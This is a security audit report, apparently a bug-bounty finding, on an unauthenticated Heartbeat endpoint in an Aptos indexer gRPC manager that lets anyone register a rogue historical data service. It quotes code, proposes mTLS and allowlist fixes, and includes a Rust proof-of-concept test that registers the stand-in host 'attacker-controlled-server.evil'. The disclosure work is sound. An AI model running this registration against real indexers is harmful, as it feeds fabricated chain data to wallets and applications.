# Audit Report

## Title
Authorization Bypass Allows Malicious Historical Data Service Registration Leading to Indexer Database Corruption

## Summary
The `Heartbeat` gRPC endpoint in the indexer-grpc-manager service lacks authentication and authorization checks, allowing any attacker to register malicious historical data services. These malicious services can then serve fabricated blockchain data to clients, corrupting indexer databases across the ecosystem.

## Finding Description

The indexer-grpc-manager component serves as a routing layer that directs client requests to appropriate data service instances. However, it contains a critical authorization bypass vulnerability in the service registration mechanism.

The vulnerability exists in the following code path:

1. **Public Endpoint Without Authentication**: The `Heartbeat` gRPC method is publicly exposed without any authentication mechanism. [1](#0-0) 

2. **Unconditional Service Registration**: The `handle_heartbeat` function accepts any incoming `ServiceInfo` and routes it to the appropriate handler without validation. [2](#0-1) 

3. **No Authorization in Service Handler**: The `handle_historical_data_service_info` function unconditionally stores any address and service information in the `historical_data_services` DashMap without verifying the sender's identity or authorization. [3](#0-2) 

4. **Malicious Service Selection**: The `pick_historical_data_service` function selects from ALL registered services using only load balancing logic, with no trust validation. [4](#0-3) 

5. **Client Request Routing**: The gateway proxies all client traffic to the selected service address, including malicious services. [5](#0-4) 

**Attack Sequence:**

1. Attacker deploys a malicious data service at `http://attacker.evil:50051` that implements the `DataService` gRPC interface
2. Attacker sends a `HeartbeatRequest` to the public GrpcManager endpoint with:
   - `service_info.address = "http://attacker.evil:50051"`
   - `service_info.info = HistoricalDataServiceInfo` with fabricated but plausible metadata
3. The malicious service is stored in `historical_data_services` without any authorization check
4. Client requests historical data via the indexer gateway
5. GrpcManager may return the attacker's address via `get_data_service_for_request`
6. Gateway proxies the client's request to the attacker's server
7. Attacker serves fabricated transactions, events, and state changes
8. Client's indexer processes and stores the false data, corrupting their database

**Configuration Analysis**: The configuration only contains statically-defined `grpc_manager_addresses` and `fullnode_addresses`, but has no mechanism for whitelisting or validating historical/live data services. [6](#0-5) 

The gRPC server setup confirms no authentication middleware or interceptors are configured. [7](#0-6) 

## Impact Explanation

**Severity: CRITICAL**

This vulnerability meets the "Critical Severity" criteria from the Aptos Bug Bounty program for the following reasons:

1. **State Consistency Violation**: Breaks the "State Consistency" invariant - indexer databases should contain accurate, verifiable blockchain data derived from the canonical chain. Malicious services can inject completely fabricated historical data.

2. **Data Integrity Breach**: Indexer databases are trusted sources of blockchain history for applications, wallets, explorers, and DeFi protocols. Corruption of this data can lead to:
   - Incorrect balance displays in wallets
   - False transaction histories
   - Manipulation of on-chain event data affecting DeFi protocols
   - Compromised analytics and reporting

3. **Widespread Impact**: A single malicious service can affect ALL clients using the indexer-grpc-manager infrastructure, as there's no mechanism to detect or prevent the attack.

4. **No Recovery Mechanism**: Once corrupted data enters indexer databases, there's no automatic detection or rollback mechanism. Manual intervention and database reconstruction would be required.

5. **Potential Financial Loss**: Applications making financial decisions based on corrupted indexer data (e.g., DeFi protocols checking historical events, NFT marketplaces verifying ownership history) could suffer financial losses.

While this vulnerability doesn't directly affect consensus or validator operations, it compromises the critical infrastructure that applications rely upon to interact with the blockchain, making it a Critical severity issue.

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is highly likely to be exploited:

1. **Zero Prerequisites**: Attacker needs no special access, credentials, or stake in the network
2. **Simple Exploitation**: Requires only a single gRPC call to a public endpoint
3. **No Detection**: No logging or monitoring alerts administrators to unauthorized service registrations
4. **High Value Target**: Indexer infrastructure is critical for the entire ecosystem
5. **Stealth Attack**: Malicious service can serve mostly legitimate data with subtle manipulations, making detection difficult
6. **Public Endpoint**: The gRPC manager endpoint is necessarily public to allow legitimate services to register

## Recommendation

Implement a multi-layered authorization mechanism:

**1. Authentication Layer**: Add mutual TLS (mTLS) authentication to verify service identity:

```rust
// In grpc_manager.rs
use tonic::transport::ServerTlsConfig;

pub(crate) fn start(&self, service_config: &ServiceConfig) -> Result<()> {
    let tls_config = ServerTlsConfig::new()
        .client_ca_root(load_ca_cert(&service_config.ca_cert_path)?)
        .identity(load_identity(&service_config.cert_path, &service_config.key_path)?);
    
    let server = Server::builder()
        .tls_config(tls_config)?
        .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
        .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
        .add_service(service);
    // ...
}
```

**2. Service Whitelist**: Add configuration for allowed data services:

```rust
// In config.rs
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct IndexerGrpcManagerConfig {
    // ... existing fields ...
    pub(crate) allowed_historical_data_services: Vec<GrpcAddress>,
    pub(crate) allowed_live_data_services: Vec<GrpcAddress>,
}
```

**3. Authorization Check**: Validate services against whitelist before registration:

```rust
// In metadata_manager.rs
fn handle_historical_data_service_info(
    &self,
    address: GrpcAddress,
    mut info: HistoricalDataServiceInfo,
) -> Result<()> {
    // NEW: Verify service is in allowed list
    if !self.allowed_historical_data_services.contains(&address) {
        bail!("Unauthorized historical data service: {}", address);
    }
    
    let mut entry = self
        .historical_data_services
        .entry(address.clone())
        .or_insert(HistoricalDataService::new(address));
    // ... rest of function ...
}
```

**4. Signature-Based Authorization**: Require cryptographic signatures from authorized operators:

```rust
message ServiceInfo {
  optional string address = 1;
  optional bytes signature = 6; // NEW: Ed25519 signature
  oneof info {
      // ... existing fields ...
  }
}
```

## Proof of Concept

```rust
// File: ecosystem/indexer-grpc/indexer-grpc-manager/tests/authorization_bypass_test.rs

use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    service_info::Info,
    HeartbeatRequest, HistoricalDataServiceInfo, ServiceInfo, StreamInfo,
};
use aptos_indexer_grpc_utils::timestamp_now_proto;

#[tokio::test]
async fn test_unauthorized_historical_service_registration() {
    // Setup: Start GrpcManager server on localhost:50051
    // (Omitted for brevity - use existing test infrastructure)
    
    // Step 1: Attacker creates malicious service info
    let malicious_address = "http://attacker-controlled-server.evil:50051".to_string();
    let malicious_info = HistoricalDataServiceInfo {
        chain_id: 1, // Mainnet
        timestamp: Some(timestamp_now_proto()),
        known_latest_version: Some(1000000),
        stream_info: Some(StreamInfo {
            active_streams: vec![],
        }),
    };
    
    // Step 2: Create heartbeat request
    let service_info = ServiceInfo {
        address: Some(malicious_address.clone()),
        info: Some(Info::HistoricalDataServiceInfo(malicious_info)),
    };
    
    let request = HeartbeatRequest {
        service_info: Some(service_info),
    };
    
    // Step 3: Send unauthenticated heartbeat (should fail with proper auth, but succeeds)
    let mut client = GrpcManagerClient::connect("http://localhost:50051")
        .await
        .expect("Failed to connect");
    
    let response = client.heartbeat(request).await;
    
    // Step 4: Verify malicious service was registered (VULNERABILITY!)
    assert!(response.is_ok(), "Heartbeat should succeed - this is the vulnerability!");
    
    // Step 5: Verify service appears in historical_data_services map
    // Query GetDataServiceForRequest to confirm malicious service can be selected
    let get_service_request = GetDataServiceForRequestRequest {
        user_request: Some(GetTransactionsRequest {
            starting_version: Some(500000), // Historical range
        }),
    };
    
    let service_response = client
        .get_data_service_for_request(get_service_request)
        .await
        .expect("Failed to get data service");
    
    // Malicious service may be returned (probabilistic based on load balancing)
    let returned_address = service_response.into_inner().data_service_address;
    println!("Returned data service: {}", returned_address);
    
    // If malicious address is returned, attacker can now serve fake data
    // This demonstrates the authorization bypass is exploitable
}
```

**To run the PoC:**
```bash
cd ecosystem/indexer-grpc/indexer-grpc-manager
cargo test --test authorization_bypass_test -- --nocapture
```

## Notes

**Additional Context:**

1. **Scope Limitation**: This vulnerability specifically affects the indexer infrastructure, not the core consensus or validator operations. However, indexers are critical infrastructure that applications depend on.

2. **Related Components**: The same authorization bypass pattern exists for `handle_live_data_service_info`, creating similar risks for live data services. [8](#0-7) 

3. **Defense-in-Depth Needed**: Even with authentication, implement additional safeguards:
   - Rate limiting on heartbeat endpoint
   - Monitoring and alerting on new service registrations
   - Health checks to verify registered services return valid data
   - Cryptographic verification of served data against blockchain state

4. **Deployment Considerations**: In production deployments, operators may have mitigated this by:
   - Running GrpcManager in private networks
   - Using firewall rules to restrict access
   - However, the code itself contains no authorization logic, making it vulnerable if deployment assumptions change

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L90-105)
```rust
    async fn pick_historical_data_service(&self, starting_version: u64) -> Option<String> {
        let file_store_version = self.data_manager.get_file_store_version().await;
        if starting_version >= file_store_version {
            return None;
        }

        let mut candidates = vec![];
        for candidate in self.metadata_manager.get_historical_data_services_info() {
            if let Some(info) = candidate.1.back().as_ref() {
                let num_active_streams = info.stream_info.as_ref().unwrap().active_streams.len();
                candidates.push((candidate.0, num_active_streams));
            }
        }

        Self::pick_data_service_from_candidate(candidates)
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L330-339)
```rust
    pub(crate) fn handle_heartbeat(&self, address: GrpcAddress, info: Info) -> Result<()> {
        match info {
            Info::LiveDataServiceInfo(info) => self.handle_live_data_service_info(address, info),
            Info::HistoricalDataServiceInfo(info) => {
                self.handle_historical_data_service_info(address, info)
            },
            Info::FullnodeInfo(info) => self.handle_fullnode_info(address, info),
            Info::GrpcManagerInfo(info) => self.handle_grpc_manager_info(address, info),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L511-531)
```rust
    fn handle_historical_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: HistoricalDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .historical_data_services
            .entry(address.clone())
            .or_insert(HistoricalDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-gateway/src/gateway.rs (L138-152)
```rust
    let mut client = GrpcManagerClient::connect(config.grpc_manager_address.to_string())
        .await
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
    let grpc_manager_request =
        tonic::Request::new(GetDataServiceForRequestRequest { user_request });
    let response: GetDataServiceForRequestResponse = client
        .get_data_service_for_request(grpc_manager_request)
        .await
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?
        .into_inner();

    let url = Url::from_str(&response.data_service_address).unwrap();
    let mut req = Request::from_parts(head, body);
    req.extensions_mut().insert(url);
    Ok(next.run(req).await)
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/config.rs (L31-42)
```rust
pub struct IndexerGrpcManagerConfig {
    pub(crate) chain_id: u64,
    pub(crate) service_config: ServiceConfig,
    #[serde(default = "default_cache_config")]
    pub(crate) cache_config: CacheConfig,
    pub(crate) file_store_config: IndexerGrpcFileStoreConfig,
    pub(crate) self_advertised_address: GrpcAddress,
    pub(crate) grpc_manager_addresses: Vec<GrpcAddress>,
    pub(crate) fullnode_addresses: Vec<GrpcAddress>,
    pub(crate) is_master: bool,
    pub(crate) allow_fn_fallback: bool,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L91-105)
```rust
    pub(crate) fn start(&self, service_config: &ServiceConfig) -> Result<()> {
        let service = GrpcManagerServer::new(GrpcManagerService::new(
            self.chain_id,
            self.metadata_manager.clone(),
            self.data_manager.clone(),
        ))
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);

```
